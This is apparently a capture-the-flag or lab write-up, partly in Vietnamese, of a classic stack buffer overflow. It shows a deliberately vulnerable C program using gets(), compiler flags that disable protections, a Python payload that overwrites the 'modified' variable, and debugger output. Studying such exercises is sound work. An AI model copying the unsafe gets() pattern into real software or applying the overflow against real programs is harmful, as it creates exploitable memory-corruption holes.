# Preview

Source Code :
```shell
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}

```

Compile: 
```shell
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie -m32
```

Type file :
```
└─$ file vuln | tr "," "\n"
vuln: ELF 32-bit LSB executable
 Intel 80386
 version 1 (SYSV)
 dynamically linked
 interpreter /lib/ld-linux.so.2
 BuildID[sha1]=e847a04ca23768cd6d91092661ab06756317524c
 for GNU/Linux 3.2.0
 not stripped
```
# Exploit

Lỗ hổng nằm trong hàm gets() dẫn đến tràn bộ nhớ. Khi compile hệ thống cũng đã cảnh báo:
```shell
vuln.c:13:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   13 |   gets(buffer);
      |   ^~~~
      |   fgets
vuln.c:(.text+0x2c): warning: the `gets' function is dangerous and should not be used.
```

ASM
```shell
    .....
   0x08049185 <+15>:    sub    esp,0x50         <--- đỉnh stack tăng lên 80 bytes
   0x08049188 <+18>:    call   0x80490b0 <__x86.get_pc_thunk.bx>
   0x0804918d <+23>:    add    ebx,0x2e67
   0x08049193 <+29>:    mov    DWORD PTR [ebp-0xc],0x0          <===> modified = 0;
    .....
```
Biến modified nằm ở vị trí [ebp- 0xc] (ebp - 12); 
```
+-------+-----+------------+-----------+-----+-------+--------+
| Stack | ... | Buffer     | modified  | ... | EBP   |        |
+=======+=====+============+===========+=====+=======+========+
| Low   | ... | [EBP-0x50] | [EBP-0xc] | ... | [EBP] | High   |
+-------+-----+------------+-----------+-----+-------+--------+
|       |     | ESP ...    | 4 bytes   |     |       | Little |
+-------+-----+------------+-----------+-----+-------+--------+
```
=> offset = 68 = Buffer + modified

**Payload:**
```shell
Stack = 0x50 #80
Buffer = "a" * 64
MDF = "\x66" * 4
EBP = "\x99" * 4
payload = "a" * 64 + "\x66" * 4 + "\x88" * 8 +"\x99" * 4
print(payload)
```

Attack: 
```
└─$ python2 payload.py > input
```
```
└─$ ./vuln < input
you have changed the 'modified' variable
Segmentation fault
```

# More
```shell
pwndbg> stack 50
00:0000│ esp 0xffffce70 ◂— 0x0
01:0004│-054 0xffffce74 ◂— 0x1
02:0008│-050 0xffffce78 —▸ 0xf7ffda30 ◂— 0x0
03:000c│ eax 0xffffce7c ◂— 0x61616161 ('aaaa')      <--- buffer[] start
... ↓        15 skipped
13:004c│-00c 0xffffcebc ◂— 0x66666666 ('ffff')      <--- Modified start
14:0050│-008 0xffffcec0 ◂— 0x88888888
15:0054│-004 0xffffcec4 ◂— 0x88888888
16:0058│ ebp 0xffffcec8 ◂— 0x99999999       <--- EBP be changed
```



